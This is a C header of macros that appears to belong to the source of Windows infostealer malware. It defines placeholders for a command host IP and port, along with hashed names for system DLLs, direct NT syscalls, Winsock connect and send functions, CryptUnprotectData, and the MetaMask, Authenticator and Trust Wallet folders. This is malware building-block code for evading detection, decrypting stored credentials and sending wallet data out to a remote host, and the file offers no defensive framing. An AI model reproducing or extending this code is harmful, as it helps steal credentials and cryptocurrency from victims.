#ifndef MACROS_YS
#define MACROS_YS


#define HOST_IP         IPHERE
#define HOST_PORT       PORTHERE

/*DLLs HASHES*/
#define NTDHASH         0x26ac37d5
#define KRN32DL         0x23e6b043

/*TLS CALLBACK FUNTIONS HASHES*/
#define TPALLOCWORK     0x165396b5
#define TPPOSTWORK      0x58b458d8
#define TPRELEASEWORK   0x78e14d39

/*SYSCALLS HASHES*/
#define NTCREATEFILE    0x3a07bcac
#define NTWRITEFILE     0x373fa842
#define NTREADFILE      0x5afef5e
#define NTQINFOFILE     0x6006aff6
#define NTQDIRFILE      0x44b5b928
#define NTALLOCMEM      0x3cd9ab47
#define NTFREEMEM       0x489a0267
#define NTWAITOBJ       0x671a2d89

/*WINSCOKET FUNCTIONS HASHES*/
#define WSATART         0x2bbff9d5
#define WSASOCK         0x2ac548dc
#define WSACONN         0x177f112d
#define SENDHASH        0x781e7

/*ENVIRONMENT VARIABLE HASHES*/
#define LOCALAPP        0x72bce3a3
#define TEMPFOLDER      0x65d81

/*CRYPTO WALLET FOLDERS HASHES*/
#define METAMASK        0x3ebb3cab
#define AUTHENTICATOR   0x18707720
#define TRUSTWALLET     0x581c156f

/*OTHER FUNCTIONS HASHES*/
#define CRYPTOUNPROTECTDATA 0x23f13459
#define LDRLOADDLL      0x4c574782 


#endif